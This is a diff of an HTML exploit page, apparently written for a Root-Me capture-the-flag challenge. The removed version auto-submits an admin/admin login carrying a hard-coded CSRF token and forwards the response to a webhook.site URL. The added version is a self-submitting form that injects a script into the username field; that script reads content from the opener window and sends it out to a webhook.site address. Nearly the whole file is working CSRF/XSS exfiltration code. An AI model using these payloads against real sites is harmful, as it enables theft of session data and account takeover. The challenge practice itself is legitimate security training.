@@ -1,50 +1,15 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <title>Redirecting...</title>
-</head>
-<body>
-   <script>
-window.addEventListener('DOMContentLoaded', () => {
-    const csrfToken = 'k8bjiEQT-c4fYoukfbhAHxU4lE-_aDQm88gI'; // Injected CSRF token
-
-    fetch('http://127.0.0.1:58039/login', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: new URLSearchParams({
-            username: 'admin',
-            password: 'admin',
-            _csrf: csrfToken
-        })
-    })
-    .then(res => res.json())
-    .then(data => {
-        console.log('Login response:', data);
-
-        // Send login response to a webhook
-        return fetch('https://webhook.site/8fe688bc-4748-4bb3-8d32-25dd0c2cdfd0', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                source: 'auto-login',
-                loginResponse: data
-            })
-        });
-    })
-    .then(webhookRes => {
-        if (!webhookRes.ok) {
-            throw new Error('Webhook request failed');
-        }
-        console.log('Webhook sent successfully');
-    })
-    .catch(err => {
-        console.error('Error:', err);
-    });
-});
-   </script>
-</body>
+<html>
+    <body>
+        <form method="POST" action="http://challenge01.root-me.org:58003/login">
+            <label>Username</label><br>
+            <input id="username" class="mgb-1" name="username"><br>
+            <label>Secret</label><br>
+            <input id="secret" class="mgb-1" name="secret"><br>
+            <button class="mgb-1" type="submit">Login</button>
+        </form>
+        <script>
+            document.getElementById('username').value = `<script>location = 'https://webhook.site/3efaae97-8a81-454e-81cd-1e019a8ce4e5?token='+window.opener.document.querySelector('section').innerHTML<\/script>`
+            document.forms[0].submit();
+        </script>
+    </body>
 </html>
